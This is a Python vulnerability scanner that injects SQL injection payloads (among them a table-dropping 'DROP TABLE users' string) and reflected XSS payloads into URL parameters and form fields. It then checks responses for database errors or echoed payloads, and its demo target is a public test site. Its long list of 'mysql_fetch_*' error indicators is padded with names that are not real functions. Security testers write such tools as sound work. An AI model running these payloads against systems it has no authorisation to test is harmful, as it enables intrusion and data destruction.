import requests
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import re
import time
from bs4 import BeautifulSoup

class VulnerabilityScanner:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        # SQL Injection payloads
        self.sqli_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "'; DROP TABLE users--",
            "' UNION SELECT NULL--",
            "' AND 1=1--",
            "1' OR '1'='1'--",
            "1' AND '1'='2",
            "admin'--",
            "admin'/*",
            "' OR 'x'='x"
        ]
        
        # XSS payloads
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "'><script>alert('XSS')</script>",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<details open ontoggle=alert('XSS')>",
            "<video><source onerror=alert('XSS')>"
        ]
    
    def extract_parameters(self, url):
        """Extract parameters from URL"""
        parsed = urlparse(url)
        return parse_qs(parsed.query)
    
    def test_sqli_url(self, url):
        """Test for SQL injection in URL parameters"""
        print(f"Testing SQL injection on: {url}")
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            return False
        
        for param_name in params:
            original_value = params[param_name][0]
            
            for payload in self.sqli_payloads:
                # Create new URL with payload
                test_params = params.copy()
                test_params[param_name] = [payload]
                
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
                
                try:
                    response = self.session.get(test_url, timeout=10)
                    
                    # Check for SQL error indicators
                    error_indicators = [
                        'sql syntax',
                        'mysql_fetch',
                        'oracle error',
                        'postgresql error',
                        'sqlite error',
                        'microsoft ole db',
                        'odbc error',
                        'jdbc error',
                        'database error',
                        'mysql_num_rows',
                        'mysql_fetch_array',
                        'mysql_fetch_object',
                        'mysql_fetch_assoc',
                        'mysql_fetch_row',
                        'mysql_fetch_field',
                        'mysql_fetch_lengths',
                        'mysql_fetch_all',
                        'mysql_fetch_result',
                        'mysql_fetch_string',
                        'mysql_fetch_float',
                        'mysql_fetch_int',
                        'mysql_fetch_long',
                        'mysql_fetch_ulong',
                        'mysql_fetch_short',
                        'mysql_fetch_ushort',
                        'mysql_fetch_time',
                        'mysql_fetch_date',
                        'mysql_fetch_datetime',
                        'mysql_fetch_timestamp',
                        'mysql_fetch_year',
                        'mysql_fetch_bit',
                        'mysql_fetch_decimal',
                        'mysql_fetch_bigint',
                        'mysql_fetch_unsigned',
                        'mysql_fetch_signed',
                        'mysql_fetch_zerofill',
                        'mysql_fetch_binary',
                        'mysql_fetch_blob',
                        'mysql_fetch_text',
                        'mysql_fetch_enum',
                        'mysql_fetch_set',
                        'mysql_fetch_geometry',
                        'mysql_fetch_json',
                        'mysql_fetch_point',
                        'mysql_fetch_linestring',
                        'mysql_fetch_polygon',
                        'mysql_fetch_multipoint',
                        'mysql_fetch_multilinestring',
                        'mysql_fetch_multipolygon',
                        'mysql_fetch_geometrycollection'
                    ]
                    
                    content_lower = response.text.lower()
                    for indicator in error_indicators:
                        if indicator in content_lower:
                            print(f"  [SQLI] Found SQL injection in parameter '{param_name}' with payload: {payload}")
                            return True
                    
                    time.sleep(0.5)  # Rate limiting
                    
                except Exception as e:
                    print(f"  Error testing SQL injection: {e}")
                    continue
        
        return False
    
    def test_xss_url(self, url):
        """Test for XSS in URL parameters"""
        print(f"Testing XSS on: {url}")
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            return False
        
        for param_name in params:
            original_value = params[param_name][0]
            
            for payload in self.xss_payloads:
                # Create new URL with payload
                test_params = params.copy()
                test_params[param_name] = [payload]
                
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
                
                try:
                    response = self.session.get(test_url, timeout=10)
                    
                    # Check if payload is reflected in response
                    if payload in response.text:
                        print(f"  [XSS] Found reflected XSS in parameter '{param_name}' with payload: {payload}")
                        return True
                    
                    time.sleep(0.5)  # Rate limiting
                    
                except Exception as e:
                    print(f"  Error testing XSS: {e}")
                    continue
        
        return False
    
    def test_forms(self, url):
        """Test forms for vulnerabilities"""
        print(f"Testing forms on: {url}")
        
        try:
            response = self.session.get(url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')
            
            for form in forms:
                try:
                    action = form.get('action', '') if hasattr(form, 'get') else ''
                    method = form.get('method', 'get') if hasattr(form, 'get') else 'get'
                    if method and isinstance(method, str):
                        method = method.lower()
                    else:
                        method = 'get'
                    
                    if not action:
                        action = url
                    elif isinstance(action, str) and not action.startswith('http'):
                        action = urljoin(url, action)
                    
                    # Find form inputs
                    inputs = form.find_all(['input', 'textarea']) if hasattr(form, 'find_all') else []
                    form_data = {}
                    
                    for inp in inputs:
                        try:
                            name = inp.get('name') if hasattr(inp, 'get') else None
                            if name:
                                form_data[name] = inp.get('value', '') if hasattr(inp, 'get') else ''
                        except:
                            continue
                except:
                    continue
                
                # Test SQL injection in forms
                for field_name in form_data:
                    for payload in self.sqli_payloads:
                        test_data = form_data.copy()
                        test_data[field_name] = payload
                        
                        try:
                            if method == 'post':
                                response = self.session.post(str(action), data=test_data, timeout=10)
                            else:
                                response = self.session.get(str(action), params=test_data, timeout=10)
                            
                            # Check for SQL error indicators
                            content_lower = response.text.lower()
                            error_indicators = ['sql syntax', 'mysql_fetch', 'oracle error', 'database error']
                            
                            for indicator in error_indicators:
                                if indicator in content_lower:
                                    print(f"  [SQLI] Found SQL injection in form field '{field_name}' with payload: {payload}")
                                    return True
                            
                            time.sleep(0.5)
                            
                        except Exception as e:
                            continue
                
                # Test XSS in forms
                for field_name in form_data:
                    for payload in self.xss_payloads:
                        test_data = form_data.copy()
                        test_data[field_name] = payload
                        
                        try:
                            if method == 'post':
                                response = self.session.post(str(action), data=test_data, timeout=10)
                            else:
                                response = self.session.get(str(action), params=test_data, timeout=10)
                            
                            if payload in response.text:
                                print(f"  [XSS] Found reflected XSS in form field '{field_name}' with payload: {payload}")
                                return True
                            
                            time.sleep(0.5)
                            
                        except Exception as e:
                            continue
        
        except Exception as e:
            print(f"Error testing forms: {e}")
        
        return False

def test_sqli(url):
    """Test for SQL injection vulnerabilities"""
    scanner = VulnerabilityScanner()
    return scanner.test_sqli_url(url) or scanner.test_forms(url)

def test_xss(url):
    """Test for XSS vulnerabilities"""
    scanner = VulnerabilityScanner()
    return scanner.test_xss_url(url) or scanner.test_forms(url)

if __name__ == "__main__":
    # Test the scanner
    test_url = "http://testphp.vulnweb.com/artists.php?artist=1"
    
    print("Testing SQL Injection...")
    sqli_result = test_sqli(test_url)
    print(f"SQL Injection test result: {sqli_result}")
    
    print("\nTesting XSS...")
    xss_result = test_xss(test_url)
    print(f"XSS test result: {xss_result}")
